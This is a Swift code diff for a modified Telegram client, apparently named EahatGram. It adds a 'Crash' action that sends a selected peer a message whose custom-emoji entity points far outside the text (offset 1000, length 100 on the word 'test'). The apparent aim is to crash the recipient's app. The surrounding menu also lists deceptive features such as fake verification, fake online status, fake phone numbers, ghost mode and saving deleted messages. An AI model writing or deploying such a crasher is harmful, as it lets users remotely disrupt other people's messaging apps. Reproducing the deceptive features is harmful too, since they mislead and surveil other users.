@@ -723,6 +723,7 @@ extension PeerInfoScreenNode {
 private final class EahatGramArguments {
     let context: AccountContext
     let selectPeer: () -> Void
+    let sendCrasher: () -> Void
     let addGiftToProfile: () -> Void
     let addCustomGiftToProfile: () -> Void
     let clearGifts: () -> Void
@@ -776,6 +777,7 @@ private final class EahatGramArguments {
     init(
         context: AccountContext,
         selectPeer: @escaping () -> Void,
+        sendCrasher: @escaping () -> Void,
         addGiftToProfile: @escaping () -> Void,
         addCustomGiftToProfile: @escaping () -> Void,
         clearGifts: @escaping () -> Void,
@@ -828,6 +830,7 @@ private final class EahatGramArguments {
     ) {
         self.context = context
         self.selectPeer = selectPeer
+        self.sendCrasher = sendCrasher
         self.addGiftToProfile = addGiftToProfile
         self.addCustomGiftToProfile = addCustomGiftToProfile
         self.clearGifts = clearGifts
@@ -1008,6 +1011,7 @@ private struct EahatGramState: Equatable {
 
 private enum EahatGramEntry: ItemListNodeEntry {
     case selectPeer(String)
+    case crasher
     case addGiftToProfile
     case addCustomGiftToProfile
     case clearGifts
@@ -1073,7 +1077,7 @@ private enum EahatGramEntry: ItemListNodeEntry {
 
     var section: ItemListSectionId {
         switch self {
-        case .selectPeer, .addGiftToProfile, .clearGifts, .removeAllContacts, .removeAllCalls, .nftUsernameTag, .nftUsernamePrice, .addNftUsernameTag, .fakePhoneNumber, .fakeRate, .fakeRateLevel, .fakeVerify, .targetHud, .liquidGlass, .replyQuote, .ghostMode, .fakeOnline, .saveDeletedMessages, .saveEditedMessages, .noLags, .bogatiUi, .noWarning, .downFolder, .customUiTheme, .viewUnread2Read, .voiceMod, .voiceModPreset, .voiceModV2, .voiceModV2Voice, .useDirectRpc, .refreshResponses:
+        case .selectPeer, .crasher, .addGiftToProfile, .clearGifts, .removeAllContacts, .removeAllCalls, .nftUsernameTag, .nftUsernamePrice, .addNftUsernameTag, .fakePhoneNumber, .fakeRate, .fakeRateLevel, .fakeVerify, .targetHud, .liquidGlass, .replyQuote, .ghostMode, .fakeOnline, .saveDeletedMessages, .saveEditedMessages, .noLags, .bogatiUi, .noWarning, .downFolder, .customUiTheme, .viewUnread2Read, .voiceMod, .voiceModPreset, .voiceModV2, .voiceModV2Voice, .useDirectRpc, .refreshResponses:
             return EahatGramSection.controls.rawValue
         case .farmBotUsername, .farmCommand, .farmInterval, .addFarmJob, .farmJobEnabled, .farmJobInfo, .removeFarmJob:
             return EahatGramSection.farm.rawValue
@@ -1100,6 +1104,8 @@ private enum EahatGramEntry: ItemListNodeEntry {
         switch self {
         case .selectPeer:
             return 100
+        case .crasher:
+            return 101
         case .addGiftToProfile:
             return 0
         case .clearGifts:
@@ -1232,6 +1238,12 @@ private enum EahatGramEntry: ItemListNodeEntry {
         case let .selectPeer(lhsText):
             if case let .selectPeer(rhsText) = rhs {
                 return lhsText == rhsText
+            } else {
+                return false
+            }
+        case .crasher:
+            if case .crasher = rhs {
+                return true
             } else {
                 return false
             }
@@ -1630,6 +1642,19 @@ private enum EahatGramEntry: ItemListNodeEntry {
                 style: .blocks,
                 action: {
                     arguments.selectPeer()
+                }
+            )
+        case .crasher:
+            return ItemListActionItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Crash",
+                kind: .generic,
+                alignment: .natural,
+                sectionId: self.section,
+                style: .blocks,
+                action: {
+                    arguments.sendCrasher()
                 }
             )
         case .addGiftToProfile:
@@ -2574,6 +2599,7 @@ private func eahatGramEntries(
         }
     case .test:
         entries.append(.selectPeer(state.selectedPeerTitle.isEmpty ? "Not selected" : state.selectedPeerTitle))
+        entries.append(.crasher)
         entries.append(.useDirectRpc(state.useDirectRpc))
         entries.append(.refreshResponses)
 
@@ -2767,6 +2793,41 @@ private func eahatGramScreen(context: AccountContext, starsContext: StarsContext
                 controller.dismiss()
             }
             pushControllerImpl?(controller)
+        },
+        sendCrasher: {
+            let currentState = stateValue.with { $0 }
+            guard let targetPeerId = currentState.selectedPeerId else {
+                appendResponse("crasher failed reason=NO_PEER_SELECTED")
+                return
+            }
+            
+            // Create malformed custom emoji entity with out-of-bounds range
+            let messageText = "test"
+            let malformedOffset = 1000
+            let malformedLength = 100
+            
+            let message: EnqueueMessage = .message(
+                text: messageText,
+                attributes: [
+                    TextEntitiesMessageAttribute(entities: [
+                        MessageTextEntity(
+                            range: malformedOffset ..< (malformedOffset + malformedLength),
+                            type: .CustomEmoji(stickerPack: nil, fileId: 5377305978079288312)
+                        )
+                    ])
+                ],
+                inlineStickers: [:],
+                mediaReference: nil,
+                threadId: nil,
+                replyToMessageId: nil,
+                replyToStoryId: nil,
+                localGroupingKey: nil,
+                correlationId: nil,
+                bubbleUpEmojiOrStickersets: []
+            )
+            
+            let _ = enqueueMessages(account: context.account, peerId: targetPeerId, messages: [message]).start()
+            appendResponse("crasher sent to peerId=\(targetPeerId.toInt64()) offset=\(malformedOffset) length=\(malformedLength)")
         },
         addGiftToProfile: {
             let controller = eahatGramAddGiftToProfileScreen(
